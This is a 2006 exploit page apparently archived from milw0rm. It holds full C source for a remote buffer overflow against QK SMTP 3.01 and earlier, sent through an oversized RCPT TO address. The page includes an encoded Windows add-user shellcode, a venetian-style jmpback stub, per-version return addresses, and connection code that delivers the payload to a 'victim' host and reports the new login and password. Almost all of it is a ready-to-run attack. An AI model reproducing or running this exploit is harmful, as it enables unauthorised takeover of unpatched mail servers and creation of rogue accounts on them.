<html><head><title>QK SMTP <= 3.01 (RCPT TO) Remote Buffer Overflow Exploit</title></head><pre>/*
       _______         ________           .__        _____          __
___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
\  \/  /  /_\  \ /    \  _(__  &lt;   ______ |  |  \  /   |  |__/ ___\|  |/ /
 &gt;    &lt;\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    &lt;
/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  &gt;__|_ \
      \/      \/     \/       \/   25\10\06    \/      |__|      \/     \/
      
 *   mm.           dM8
 *  YMMMb.       dMM8      _____________________________________
 *   YMMMMb     dMMM'     [                                     ]
 *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]
 *      `YMMM  MMM'       [ windows I have yet to look through  ]
 *         &quot;MbdMP         [ Going forward may not be the answer ]
 *     .dMMMMMM.P         [                                     ]
 *    dMM  MMMMMM         [       maybe I should go back        ]
 *    8MMMMMMMMMMI        [_____________________________________]
 *     YMMMMMMMMM                   www.netbunny.org
 *       &quot;MMMMMMP
 *      MxM .mmm
 *      W&quot;W &quot;&quot;&quot;

[i] Title:              QK SMTP &lt;= 3.01 RCPT-TO Buffer Overflow Exploit
[i] Discovered by:      Greg Linares
[i] Exploit by:         Expanders  -  expanders [aaat] gmail [dooot] com
[i] References:         http://www.securityfocus.com/bid/20681   ---   http://www.qksoft.com/
[i] Greatings:          x0n3-h4ck - netbunny

[ Research diary ]

Ok.. I'm ready to write some lines about this exploit..
I've encountered some problems during development:
     ESI and ESP points to our buffer, in a memory location that will be contaminated with some bytes after
     storing our data. result: I coulnt put shellcode directly here because it will be changed.
     So i had to write a short jmpback unicode-proof shellcode using venetian tecnique.
     
     Because of some unknown reasons i was not able to get a socket-based shellcode working..
     in this exploit I use an ADD USER shellcode.


[ Timeline ]

Vendor has been informed and version 3.10b has been released.

[ Notes ]

RETcode type: POINTER TO [ESP]
To improve realiability you can search your own RETcodes..

[ Documentation ]

Venetian exploit: http://www.net-security.org/dl/articles/unicodebo.pdf
Skylined Alpha2 : www.edup.tudelft.nl/~bjwever/documentation_alpha2.html.php

[ Special Thanks ]

Skylined
H D Moore
Greg Linares


[ Links ]

www.x0n3-h4ck.org
www.netbunny.org



*/

#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;

// You may want to change this, is the user and the password of shellcode added user
#define NETADD_USER &quot;x0n3&quot;
#define NETADD_PASS &quot;h4ck&quot;

// Exploit internal constant, change only if you know what you are doing
#define HELO &quot;EHLO\r\n&quot;
#define MAIL_FROM &quot;MAIL FROM: &lt;good@ye.com&gt;\r\n&quot;
#define BUGSTR &quot;RCPT TO: %s@fuck.com&gt;\r\n&quot;
#define BUFFSIZE 10000
#define SC_MAX_SIZE 800
#define MAX_ENCODED_LEN 100

// Offsets
#define RET_OFFSET       296
#define JMPBACK_OFFSET   4089
#define SHELLCODE_OFFSET 2524

int encode_alphanum(unsigned char *src,unsigned char *dest,int len);
int banner();
int usage(char *filename);
int inject(char *port, char *ip);
int remote_connect( char* ip, unsigned short port );


// win32 ADD user un-encoded shellcode taken from metasploit [ tnx hdm &amp; vlas902 ]
// encoded using Skylined alpha2 tool
char alphanum_shellcode[] =
        // Skylined's alpha2 unicode decoder
        &quot;PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABA&quot;
        &quot;BABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB&quot;
        // Encoded opcodes
        &quot;ylzHOTM0KPkP2kQ5OL2kQlKUt8kQzOtK0On82k1OO0KQ8kpIDKoDTKKQXnnQ7P4Y4lU4upptm7i1WZLM&quot;
        &quot;kQWRJKJTMkpTLdzdt59UdKooktkQzKOv4KlLNkDKooMLyqZKBkMLRkzajKQyQLmTM45sNQUpotRkmplp&quot;
        &quot;tEupQhlLBkoPlLRkRPKlvMRkoxjhzKKYtKqpFPkPm0KPbkphMlaOlqhvqPPVriJXCS5pCKNpOxJO8Nk0&quot;
        &quot;C0c8eHKNqzznPW9oyW1SBMotnNaUQhaUkpNOpckpRNOuqdmPRUpsqUPrmP%skp%s&quot;
        &quot;mPnOQ1OTNdo0mVMVMPpnOurTMP0lBOqS31PlC7prpobU0pkpoQotPmoyPn1YT3ptT2aQPtpo1bBSkp%s&quot;
        &quot;MPNOOQa4oTkPA&quot;;


//  Fully customizable UNICODE-PROOF jmpback shellcode
//  Written with venetian tecnique to jmpback as more as possible using as less as possible bytes
//  Note that \x73 is &quot;add byte ptr [ebx],dh&quot;, ebx point to a useless but writable location so
//  we can use this instruction as a unicode NOP to realign with our next instruction
unsigned char jmpback[] =
        &quot;\x50\x73&quot; // push eax  |
        &quot;\x54\x73&quot; // push esp  |  Workaroung for &quot;xchg eax,esp&quot; cos 0x96 is filtered
        &quot;\x58\x73&quot; // pop eax   |____
        &quot;\xB0&quot; //  mov al,0x0   |  Set last eax byte to zero..
        &quot;\x48\x73&quot; // dec ax    |  ..and next we decrement eax
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;  //      |  Again...
        &quot;\xB0\x48\x73&quot;  //      |  ...and angain
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;  //      |  every time it substract 0xFF to eax
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;
        &quot;\xB0\x48\x73&quot;
        &quot;\x48\x73&quot;//            |  eax is aligned to the shellcode
        &quot;\x50\x73&quot; //  push eax
        &quot;\xC3\x73&quot;; // retn

        //&quot;\x50\x73\xBA\xAA\xAA\x73\x52\x73\xC3\x73&quot;;   // push eax = 0xAA00AA00 and retn !!DEBUG!!


struct retcodes{char *platform;unsigned long addr;} targets[]= {
    { &quot;Windows NT Universal&quot;, 0x77cec080 },   // shell32.dll push esp, ret  [Tnx to metasploit]
	{ &quot;Windows 2k SP 4&quot;     , 0x75031dce },   // ws2_32.dll push esp, ret   [Tnx to metasploit]
	{ &quot;Windows XP SP 0/1&quot;   , 0x71ab7bfb },   // ws2_32.dll jmp esp         [Tnx to metasploit]
    { &quot;Windows XP SP 2 ENG&quot; , 0x71ab9372 },   // ws2_32.dll push esp, ret   [Tnx to metasploit]
	{ &quot;Windows XP SP 2 ITA&quot; , 0x77D92CFC },   // user32.dll jmp esp
	{ NULL }
};
int banner() {
  printf(&quot;\n       _______         ________           .__        _____          __     \n&quot;);
  printf(&quot;___  __\\   _  \\   ____ \\_____  \\          |  |__    /  |  |   ____ |  | __ \n&quot;);
  printf(&quot;\\  \\/  /  /_\\  \\ /    \\  _(__  &lt;   ______ |  |  \\  /   |  |__/ ___\\|  |/ / \n&quot;);
  printf(&quot; &gt;    &lt;\\  \\_/   \\   |  \\/       \\ /_____/ |   Y  \\/    ^   /\\  \\___|    &lt;  \n&quot;);
  printf(&quot;/__/\\_ \\\\_____  /___|  /______  /         |___|  /\\____   |  \\___  &gt;__|_ \\ \n&quot;);
  printf(&quot;      \\/      \\/     \\/       \\/               \\/      |__|      \\/     \\/ \n\n&quot;);
  printf(&quot;[i] Title:        \tQK SMTP Remote RCPT-TO Buffer overflow\n&quot;);
  printf(&quot;[i] Discovered by:\tGreg Linares\n&quot;);
  printf(&quot;[i] Exploit by:   \tExpanders\n\n&quot;);
  return 0;
}

int usage(char *filename) {
  int i;
  printf(&quot;Usage: \t%s &lt;host&gt; &lt;port&gt; &lt;targ&gt;\n\n&quot;,filename);
  printf(&quot;       \t&lt;host&gt;   : Victim's host\n&quot;);
  printf(&quot;       \t&lt;port&gt;   : Victim's port  ::  Default: 25\n&quot;);
  printf(&quot;       \t&lt;targ&gt;   : Target from the list below\n\n&quot;);
  
  printf(&quot;#   \t Platform\n&quot;);
  printf(&quot;-----------------------------------------------\n&quot;);
  for(i = 0; targets[i].platform; i++)
        printf(&quot;%d \t %s\n&quot;,i,targets[i].platform);
  printf(&quot;-----------------------------------------------\n&quot;);
  exit(0);
}


int remote_connect( char* ip, unsigned short port )
{
  int s;
  struct sockaddr_in remote_addr;
  struct hostent* host_addr;

  memset ( &amp;remote_addr, 0x0, sizeof ( remote_addr ) );
  if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
  {
   printf ( &quot;[X] Cannot resolve \&quot;%s\&quot;\n&quot;, ip );
   exit ( 1 );
  }
  remote_addr.sin_family = AF_INET;
  remote_addr.sin_port = htons ( port );
  remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr-&gt;h_addr );
  if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) &lt; 0 )
  {
   printf ( &quot;[X] Socket failed!\n&quot; );
   exit ( 1 );
  }
  if ( connect ( s, ( struct sockaddr * ) &amp;remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
  {
   printf ( &quot;[X] Failed connecting!\n&quot; );
   exit ( 1 );
  }
  return ( s );
}

int main(int argc, char *argv[]) {
    int s,position;
    char encoded_user[MAX_ENCODED_LEN];
    char encoded_pass[MAX_ENCODED_LEN];
    unsigned int rcv;
    char *buffer,*request;
    char recvbuf[256];
    char shellcode[SC_MAX_SIZE];
    banner();
    if( (argc != 4) || (atoi(argv[2]) &lt; 1) || (atoi(argv[2]) &gt; 65534) )
        usage(argv[0]);
    printf(&quot;[+] Target OS is: %s\n&quot;,targets[atoi(argv[3])].platform);
    printf(&quot;[+] Creating evil buffer...&quot;);
    fflush(stdout);
    buffer = (char *) malloc(BUFFSIZE);
    request = (char *) malloc(BUFFSIZE + strlen(BUGSTR));
    memset(buffer,0x73,BUFFSIZE);  // Fill with unicode nops
    memset(buffer+4000,0x45,1000);
    encode_alphanum(encoded_user,NETADD_USER,strlen(NETADD_USER));
    encode_alphanum(encoded_pass,NETADD_PASS,strlen(NETADD_PASS));
    sprintf(shellcode,alphanum_shellcode,encoded_user,encoded_pass,encoded_user);
    memcpy(buffer+RET_OFFSET,&amp;targets[atoi(argv[3])].addr,4);
    memcpy(buffer+SHELLCODE_OFFSET,shellcode,strlen(shellcode));
    memcpy(buffer+JMPBACK_OFFSET,jmpback,strlen(jmpback));
    memset(buffer+4500,0x00,1);
    printf(&quot;done\n&quot;);
    printf(&quot;[+] Connecting to remote host\n&quot;);
    s = remote_connect(argv[1],atoi(argv[2]));
    //rcv=recv(s,recvbuf,256,0);
    if((rcv = recv(s,recvbuf,256,0)) &lt; 0)
    {
     printf(&quot;\n[X] Error while recieving banner!\n&quot;);
     exit( 1 );
    }
    if (strstr(recvbuf,&quot;QK SMTP&quot;)!=0)
    {
     sleep(1);
     sprintf(request,&quot;%s&quot;,HELO);
     printf(&quot;[+] Sending EHLO\n&quot;);
     if ( send ( s, request, strlen(request), 0) &lt;= 0 )
     {
            printf(&quot;[X] Failed to send buffer\n&quot;);
            exit ( 1 );
     }
     sleep(1);
     sprintf(request,&quot;%s&quot;,MAIL_FROM);
     printf(&quot;[+] Sending MAIL FROM\n&quot;);
     if ( send ( s, request, strlen(request), 0) &lt;= 0 )
     {
            printf(&quot;[X] Failed to send buffer\n&quot;);
            exit ( 1 );
     }
     sleep(1);
     sprintf(request,BUGSTR,buffer);
     printf(&quot;[+] Sending EXPLOIT\n&quot;);
     if ( send ( s, request, strlen(request), 0) &lt;= 0 )
     {
            printf(&quot;[X] Failed to send buffer\n&quot;);
            exit ( 1 );
     }
     sleep(1);
     printf(&quot;[+] Done - New account should have been added:\n&quot;);
     printf(&quot;[i] LOGIN:\t%s\n&quot;,NETADD_USER);
     printf(&quot;[i] PASSWORD:\t%s\n&quot;,NETADD_PASS);
     printf(&quot;[+] Exploit now hangs up. see ya.\n\n&quot;);
    } else
     printf(&quot;[X] This server is not running QK SMTP\n&quot;);
    close(s);
    free(buffer);
    free(request);
    return 0;
}

// Ripped from Skylined's alpha2.c
int encode_alphanum(unsigned char *dest,unsigned char *src,int len){
  char dump[2];
  int   i,n, input, A, B, C, D, E, F;
  char* valid_chars;
  struct timeval tv;
  struct timezone tz;
  memset(dest,0x00,MAX_ENCODED_LEN);
  gettimeofday(&amp;tv, &amp;tz);
  srand((int)tv.tv_sec*1000+tv.tv_usec);
  valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;
  for(n=0;n&lt;len;n++) {
    input = src[n];
    A = (input &amp; 0xf0) &gt;&gt; 4;
    B = (input &amp; 0x0f);
    F = B;
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] &amp; 0x0f) != F) { i = ++i % strlen(valid_chars); }
    E = valid_chars[i] &gt;&gt; 4;
    D = (A-E) &amp; 0x0f;
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] &amp; 0x0f) != D) { i = ++i % strlen(valid_chars); }
    C = valid_chars[i] &gt;&gt; 4;
    sprintf(dump,&quot;%c%c&quot;, (C&lt;&lt;4)+D, (E&lt;&lt;4)+F);
    strcat(dest,dump);
  }
  return 0;
}

// milw0rm.com [2006-10-25]</pre></html>